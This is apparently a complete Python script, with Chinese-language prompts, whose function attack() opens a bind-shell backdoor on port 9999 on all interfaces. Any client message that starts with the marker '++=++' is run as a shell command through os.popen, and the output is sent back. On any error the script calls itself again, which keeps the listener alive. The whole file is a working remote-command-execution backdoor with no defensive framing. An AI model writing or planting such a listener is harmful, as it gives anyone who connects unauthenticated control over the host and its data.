import socket,os
def attack():
    try:
        soc=socket.socket()
        soc.bind(("0.0.0.0",9999))
        soc.listen(5)
        newsoc,info=soc.accept()
        while True:
            ceimess=newsoc.recv(1024).decode('utf-8')
            print("收到来自客户端的消息：",ceimess)
            if ceimess.startswith("++=++"):
                command=ceimess.split(",")
                result=os.popen(command[1]).read()
                newsoc.send(f"收到你要执行的命令：{command[1]}\n{result}".encode("utf-8"))
            else:
                message=input("请输入要回复的消息")
                newsoc.send(message.encode('utf-8'))
    except:
        soc.close()
        attack()
if __name__=="__main__":
    attack()